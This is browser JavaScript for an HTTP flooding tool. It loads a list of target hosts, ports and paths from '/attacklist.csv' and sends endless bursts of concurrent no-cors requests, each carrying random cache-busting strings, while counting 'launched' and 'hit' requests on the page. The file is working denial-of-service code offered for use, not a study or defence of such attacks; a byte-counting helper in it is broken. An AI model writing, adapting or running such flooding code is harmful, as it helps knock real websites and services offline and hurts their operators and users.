(function () {
  var elements = {
    btnStart: document.getElementById("btnAction"),
    btnStop: document.getElementById("btnStop"),
    counter: document.getElementById("txtCounter"),
  };

  var counter = {
    total: 0,
    hit: 0,
  };

  var stats = {
    // TODO
  }

  var isActive = false

  function refreshCounter() {
    elements.counter.innerHTML = `Launched: <strong>${counter.total}</strong>, Hit: <strong>${counter.hit}</strong>`;
  }

  window.getTargets = function (cb) {
    fetch("/attacklist.csv").then((res) => {
      res.text().then((list) => {
        var targets = list
          .split("\n")
          .slice(1)
          .filter((i) => !!i)
          .map((i) => {
            var row = i.split(",");
            return {
              title: row[0],
              method: row[1],
              host: row[2],
              port: row[3],
              path: row[4],
            };
          });
        cb(targets);
      });
    });
  };

  var getMaxConcurrent = function () {
    return 20;
  }

  window.stopCannon = function() {
    elements.btnStart.style.display = "initial";
    elements.btnStop.style.display = "none";
    isActive = false;
  }

  var calcRequestBytes = function (method, uri, body) {
      return method.length 
        + 1
        + uri
        + 'HTTP'
  }

  window.launchCannon = function (bytes, progressCb, done) {
    var maxConcurrent = getMaxConcurrent();
    elements.btnStart.style.display = "none";
    elements.btnStop.style.display = "initial";
    isActive = true;

    getTargets(function (targets) {
      function fireRequests() {
        var target = targets[Math.floor(Math.random() * targets.length)];
        function fire() {
          if (!isActive) { return }
          counter.total++;
          var rand = `${Math.floor(Math.random() * 1000000)}-${new Date().getTime()}`;
          refreshCounter();
          fetch(`https://${target.host}:${target.port}/${(target.path || '').replace('{rand}', rand)}`, {
            method: target.method || 'GET',
            mode: "no-cors",
          }).finally(function (err) {
            counter.hit++;
            refreshCounter();
            // TODO until done
            fire();
          });
        }
        for (let i = 0; i <= maxConcurrent; i++) {
          fire()
        }
      }
      fireRequests();
    });
  };
})();
